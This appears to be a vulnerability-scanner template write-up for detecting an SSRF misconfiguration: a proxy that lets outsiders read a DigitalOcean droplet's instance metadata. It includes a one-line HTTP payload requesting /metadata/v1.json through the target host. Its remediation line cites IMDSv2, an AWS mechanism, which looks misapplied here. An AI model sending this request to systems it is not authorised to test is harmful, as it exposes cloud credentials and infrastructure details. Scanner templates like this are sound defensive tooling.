# Nuclei Template: DigitalOcean Metadata Service Check
**Template ID:** metadata-service-digitalocean
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-441
**Source:** Nuclei Template (`metadata-digitalocean.yaml`)

## Vulnerability Information & PoC

## Description
The DigitalOcean host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.

## Steps to reproduce / Exploit Payload
```http
GET http://{{hostval}}/metadata/v1.json HTTP/1.1
Host: {{hostval}}
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.

## References
- https://developers.digitalocean.com/documentation/metadata/
- https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
- https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
